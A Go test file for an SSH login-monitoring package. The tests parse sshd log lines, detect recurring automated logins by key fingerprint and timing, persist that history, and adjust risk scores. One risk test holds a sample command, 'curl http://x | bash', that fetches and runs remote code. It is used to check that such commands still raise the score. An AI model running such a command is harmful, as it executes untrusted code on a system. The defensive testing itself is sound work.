package session

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const fp = "SHA256:Fz0pbL2bZ0mJmUL4tW7m3DrCJ7bTq3f7d2tWm1sA9Xc"

func TestParseSSHLoginKeyFingerprint(t *testing.T) {
	pl := ParseLine("Oct 26 03:05:01 host sshd-session[4321]: Accepted publickey for root from 10.0.1.7 port 51234 ssh2: ED25519 " + fp)
	if pl == nil || pl.KeyType != "ED25519" || pl.KeyFP != fp || pl.IP != "10.0.1.7" || pl.User != "root" {
		t.Fatalf("%+v", pl)
	}
	if pl := ParseLine("Oct 26 03:05:01 host sshd[1]: Accepted password for root from 203.0.113.4 port 1 ssh2"); pl == nil || pl.KeyFP != "" {
		t.Fatalf("%+v", pl)
	}
}

// Coolify: root, same key, same private address, every 5 minutes. Once the
// series is 6 hours old it is recurring automation; another key or address
// is not.
func TestRecurringAutomationCadence(t *testing.T) {
	a := newAutomationLog()
	t0 := time.Date(2026, 10, 26, 2, 0, 0, 0, time.UTC)
	var got bool
	for i := 0; i <= 6*12; i++ {
		ts := t0.Add(time.Duration(i)*5*time.Minute + time.Duration(i%3)*time.Second)
		got = a.record("root", "10.0.1.7", fp, ts)
		// A second connection of the same run, seconds later, is the same login.
		a.record("root", "10.0.1.7", fp, ts.Add(3*time.Second))
		if got && ts.Sub(t0) < autoMinAge {
			t.Fatalf("recurring after %v", ts.Sub(t0))
		}
	}
	if !got {
		t.Fatal("6 hours of logins 5 minutes apart not recurring")
	}
	end := t0.Add(6*time.Hour + 5*time.Minute)
	if a.record("root", "10.0.1.7", "SHA256:other", end) {
		t.Fatal("a new key is recurring")
	}
	if a.record("root", "10.0.1.8", fp, end) {
		t.Fatal("a new address is recurring")
	}
	if a.record("root", "10.0.1.7", "", end) {
		t.Fatal("no fingerprint is recurring")
	}
}

// A person logging in at irregular times is not automation, however often;
// hourly from a public address needs 12 logins.
func TestIrregularLoginsAreNotAutomation(t *testing.T) {
	a := newAutomationLog()
	t0 := time.Date(2026, 10, 20, 8, 0, 0, 0, time.UTC)
	offsets := []time.Duration{0, 47 * time.Minute, 3 * time.Hour, 3*time.Hour + 20*time.Minute, 9 * time.Hour, 26 * time.Hour, 27*time.Hour + 5*time.Minute, 33 * time.Hour}
	for _, o := range offsets {
		if a.record("alice", "198.51.100.7", fp, t0.Add(o)) {
			t.Fatalf("irregular logins taken as automation at +%v", o)
		}
	}
	for i := 0; i < 12; i++ {
		got := a.record("deploy", "198.51.100.8", fp, t0.Add(time.Duration(i)*time.Hour))
		if got != (i == 11) {
			t.Fatalf("hourly login %d: %v", i+1, got)
		}
	}
}

// Saved 0600 and loaded back; old logins and bad files are dropped.
func TestAutomationLogPersists(t *testing.T) {
	path := filepath.Join(t.TempDir(), "ssh-automation.json")
	a := newAutomationLog()
	now := time.Now()
	a.load(path, now.Add(-8*time.Hour))
	for i := 0; i < 6; i++ {
		a.record("root", "10.0.1.7", fp, now.Add(time.Duration(i-6)*5*time.Minute-7*time.Hour))
	}
	for i := 0; i < 6; i++ {
		a.record("root", "10.0.1.7", fp, now.Add(time.Duration(i-6)*5*time.Minute))
	}
	if st, err := os.Stat(path); err != nil || st.Mode().Perm() != 0o600 {
		t.Fatalf("saved: %v %v", st, err)
	}
	a.mu.Lock()
	a.saveLocked(now)
	a.mu.Unlock()
	b := newAutomationLog()
	b.load(path, now)
	if !b.record("root", "10.0.1.7", fp, now) {
		t.Fatal("history lost across a restart")
	}
	c := newAutomationLog()
	c.load(path, now.Add(8*24*time.Hour))
	if len(c.logins) != 0 {
		t.Fatal("logins older than a week loaded")
	}
	_ = os.WriteFile(path, []byte("{"), 0o600)
	d := newAutomationLog()
	d.load(path, now)
	if len(d.logins) != 0 {
		t.Fatal("bad file loaded")
	}
	// Bounded.
	for i := 0; i < autoMaxKeys+20; i++ {
		d.record("root", "10.0.1.7", "SHA256:k"+strings.Repeat("x", i%7)+string(rune('a'+i%26))+time.Duration(i).String(), now)
	}
	if len(d.logins) > autoMaxKeys {
		t.Fatalf("%d keys kept", len(d.logins))
	}
}

func TestRiskRecurringAutomation(t *testing.T) {
	base := SessionData{AuthMethod: "publickey", IP: "10.0.1.7", User: "root", LoginHour: 3, SigmaAlerts: 2}
	r := CalculateRisk(base)
	if r.Score != 100 {
		t.Fatalf("baseline %+v", r)
	}
	base.RecurringAutomation = true
	r = CalculateRisk(base)
	if r.Score != 0 || strings.Join(r.Factors, ",") != "recurring_automation" {
		t.Fatalf("automation %+v", r)
	}
	// Its commands still count.
	base.Commands = []CommandEntry{{Type: "sudo", Command: "curl http://x | bash"}}
	if r = CalculateRisk(base); r.Score != 30 {
		t.Fatalf("automation with a remote exec %+v", r)
	}
}

// The tracker: a recurring automation session closes as info with the
// factor; a new key from the same address keeps the normal scoring.
func TestTrackerRecurringAutomationSession(t *testing.T) {
	type ev struct {
		typ, sev string
		d        map[string]string
	}
	var events []ev
	tr := New(func(typ, sev string, d map[string]string) { events = append(events, ev{typ, sev, d}) })
	tr.UpdateConfig(Config{Enabled: true, SigmaEnabled: true})
	now := time.Now()
	for i := 6 * 12; i >= 1; i-- {
		tr.auto.record("root", "10.0.1.7", fp, now.Add(-time.Duration(i)*5*time.Minute))
	}
	login := func(pid, key string) {
		tr.processLine("Oct 26 03:05:01 host sshd-session[" + pid + "]: Accepted publickey for root from 10.0.1.7 port 51234 ssh2: ED25519 " + key)
		tr.mu.Lock()
		tr.sessions[pid].LoginAt = now.Add(-time.Minute) // long enough to be reported
		tr.mu.Unlock()
		tr.NotifySigmaEvent("port_scan", "critical")
		tr.processLine("Oct 26 03:06:01 host sshd-session[" + pid + "]: pam_unix(sshd:session): session closed for user root")
	}
	login("100", fp)
	tr.lastEmit = map[string]time.Time{}
	login("101", "SHA256:newkey")
	var sessions []ev
	for _, e := range events {
		if e.typ == "ssh_session" {
			sessions = append(sessions, e)
		}
	}
	if len(sessions) != 2 {
		t.Fatalf("events %+v", events)
	}
	if a := sessions[0]; a.sev != "info" || a.d["risk_factors"] != "recurring_automation" || a.d["key_fingerprint"] != fp ||
		!strings.Contains(a.d["risk_factors_unadjusted"], "sigma_correlation") {
		t.Fatalf("automation session %+v", a)
	}
	if b := sessions[1]; b.sev == "info" || strings.Contains(b.d["risk_factors"], "recurring_automation") {
		t.Fatalf("new key session %+v", b)
	}
	if events[0].typ != "system_audit" || events[0].d["recurring_automation"] != "true" || events[0].d["key_type"] != "ED25519" {
		t.Fatalf("audit %+v", events[0])
	}
}
